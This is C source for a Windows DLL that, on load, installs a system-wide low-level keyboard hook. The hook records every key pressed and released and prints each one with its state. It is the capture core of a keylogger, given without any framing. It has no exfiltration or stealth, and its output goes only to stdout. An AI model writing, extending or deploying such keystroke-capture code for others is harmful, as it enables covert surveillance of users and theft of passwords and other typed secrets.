#include <windows.h>
#include <stdio.h>

// Global variables
HHOOK hook = NULL;

// Keyboard hook procedure
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;

    // Convert scan code and flags to a single value
    int msg = 1 + (kbdStruct->scanCode << 16) + (kbdStruct->flags << 24);

    // Get the name of the key
    char keyName[64];
    GetKeyNameTextA(msg, keyName, sizeof(keyName));

    // Determine the key state
    const char* keyState;
    switch (wParam) {
        case WM_KEYUP:
            keyState = "Key Up";
            break;
        case WM_KEYDOWN:
            keyState = "Key Down";
            break;
        case WM_SYSKEYUP:
            keyState = "Sys Key Up";
            break;
        case WM_SYSKEYDOWN:
            keyState = "Sys Key Down";
            break;
        default:
            keyState = "Unknown";
    }

    // Print the captured key and its state
    printf("Captured: %s\t%s\n", keyName, keyState);

    // Pass the hook information to the next hook procedure
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Entry point of the DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Install the keyboard hook when the DLL is loaded
            hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, hinstDLL, 0);
            if (hook == NULL) {
                MessageBox(NULL, "Failed to install keyboard hook", "Error", MB_OK | MB_ICONERROR);
                return FALSE;
            }
            break;
        case DLL_PROCESS_DETACH:
            // Uninstall the keyboard hook when the DLL is unloaded
            if (hook != NULL) {
                UnhookWindowsHookEx(hook);
            }
            break;
    }
    return TRUE;
}
